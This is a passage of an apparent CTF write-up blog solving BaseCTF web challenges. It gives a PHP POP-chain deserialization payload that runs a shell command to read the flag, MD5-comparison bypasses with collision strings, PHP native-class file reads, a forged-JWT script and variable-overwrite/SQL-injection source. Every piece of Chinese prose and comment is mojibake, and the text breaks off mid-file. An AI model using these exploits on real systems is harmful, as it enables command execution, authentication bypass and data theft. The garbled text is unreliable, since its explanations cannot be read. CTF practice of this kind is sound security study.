class="line">    &#125;</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    response = session.post(base_url, headers=headers, data=answer_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æäº¤äº†æ–¹ä½<span class="subst">&#123;answer_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="BASECTF-Week2-Really-EZ-POP-1"><a href="#BASECTF-Week2-Really-EZ-POP-1" class="headerlink" title="BASECTF [Week2] Really EZ POP"></a>BASECTF [Week2] Really EZ POP</h2><p>å…³äºpopé“¾çš„ç§æœ‰å±æ€§åå°„æœºåˆ¶ä»¥åŠä¸€äº›è¿‡æ»¤ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;cat\t/fl*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); <span class="comment">//0 shell</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word; <span class="comment">//1 Sink</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>(); <span class="comment">//2 Shark</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see; <span class="comment">//3 Sea</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nature</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$sea</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$shark</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$sink</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sharkReflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;Shark&#x27;</span>);</span><br><span class="line"><span class="variable">$wordProperty</span> = <span class="variable">$sharkReflection</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;word&#x27;</span>);</span><br><span class="line"><span class="variable">$wordProperty</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$wordProperty</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$shark</span>, <span class="variable">$sink</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sea</span>-&gt;animal = <span class="variable">$shark</span>;</span><br><span class="line"><span class="variable">$nature</span>-&gt;sea = <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nature</span>));</span><br></pre></td></tr></table></figure>

<h2 id="BaseCTF-æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5-1"><a href="#BaseCTF-æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5-1" class="headerlink" title="BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?"></a>BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// åŠ å¤§å‰‚é‡!</span></span><br><span class="line"><span class="comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span></span><br><span class="line"><span class="comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span></span><br><span class="line"><span class="comment">// é‚£ flag å°±ç»™ä½ å§</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸€ä¸ªåœ°æ–¹ç”¨çš„å¼ºæ¯”è¾ƒ, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡</li>
<li>ç¬¬äºŒä¸ªåœ°æ–¹å¼ºè½¬æˆäº† string, æ­¤æ—¶æ•°ç»„ä¼šå˜æˆ <code>Array</code> æ— æ³•ç»•è¿‡</li>
</ul>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒä¸ªåœ°æ–¹çš„å¼±æ¯”è¾ƒ, è®© <code>0e</code> å¼€å¤´çš„å­—ç¬¦ä¸²ä½¿ php è¯¯è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•, ä»è€Œè½¬æ¢ä¸º 0</p>
<ul>
<li>ç¬¬ä¸‰ä¸ªåœ°æ–¹ç¬¬äºŒä¸ªåœ°æ–¹ç”¨äº†å¼ºæ¯”è¾ƒ, æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ‰¾åˆ°çœŸå®çš„ MD5 å€¼ä¸€è‡´çš„å†…å®¹, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ fastcoll å·¥å…·</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p>
<p>é€šè¿‡è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o a.txt a1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240829184114078.png" alt="image-20240829184114078"></p>
<p>å¯ä»¥è·å¾—ä¸¤ä¸ªå†…å®¹ä¸åŒä½† MD5 ç›¸åŒçš„å†…å®¹, å°†å…¶å†…å®¹ urlencode ä¹‹åä¼ å…¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=QLTHNDT&amp;bananana=QNKCDZO&amp;apppple=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;banananana=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<p>ç¬¬å››ä¸ªåœ°æ–¹è€ƒäº† å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html</a></p>
<p>å‚è€ƒæ–‡ç« : <a target="_blank" rel="noopener" href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p>
<p>ä½¿ç”¨å·¥å…· <a target="_blank" rel="noopener" href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a></p>
<p>æ­¤æ—¶å¯ä»¥æ‹“å±•å‡º admin å°¾ç¼€</p>
<h2 id="Basectf-Week4-flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ-1"><a href="#Basectf-Week4-flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ-1" class="headerlink" title="Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"></a>Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$J1ng</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line"><span class="variable">$Hong</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line"><span class="variable">$Keng</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"><span class="variable">$Wang</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="variable">$Keng</span>(<span class="variable">$Wang</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$J1ng</span>(<span class="variable">$Hong</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=glob:////secret/f11444g.php</span><br><span class="line">J=SplFileObject&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=/secret</span><br><span class="line">J=SplFileObject&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>

<h1 id="Basectf-Week4-No-JWT-1"><a href="#Basectf-Week4-No-JWT-1" class="headerlink" title="Basectf [Week4] No JWT"></a>Basectf [Week4] No JWT</h1><p>è·å–jwt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_jwt_token</span>(<span class="params">login_url, username, password</span>):</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(login_url, json=login_data)</span><br><span class="line">    token = response.json().get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;JWT Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://challenge.basectf.fun:48124/login&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123&quot;</span></span><br><span class="line">get_jwt_token(login_url, username, password)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240906141821096.png" alt="image-20240906141821096"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">fake_token = <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNTYwNjQ4Nn0.lpy4mkxg3OGUh2lOlMR0syCY3Z7bL5lmV1Uo3Q17K30&#x27;</span></span><br><span class="line"></span><br><span class="line">flag_url = <span class="string">&#x27;http://challenge.basectf.fun:48124/flag&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;fake_token&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(flag_url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>

<h1 id="æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜-1"><a href="#æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜-1" class="headerlink" title="æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜"></a>æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜</h1><p>è€ƒçš„å˜é‡è¦†ç›–å’Œsqlæ³¨å…¥</p>
<p>æºç </p>
<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$limit_words</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$limit_words</span> <span class="keyword">as</span> <span class="variable">$old</span> =&gt; <span class="variable">$new</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">strlen</span>(<span class="variable">$old</span>) &gt; <span class="number">2</span> &amp;&amp; <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$old</span>,<span class="title function_ invoke__">trim</span>(<span class="variable">$new</span>),<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$limit_words</span> = <span class="keyword">array</span>(<span class="string">&#x27;é€ å&#x27;</span> =&gt; <span class="string">&#x27;é€ **&#x27;</span>, <span class="string">&#x27;æ³•è½®åŠŸ&#x27;</span> =&gt; <span class="string">&#x27;æ³•**&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span 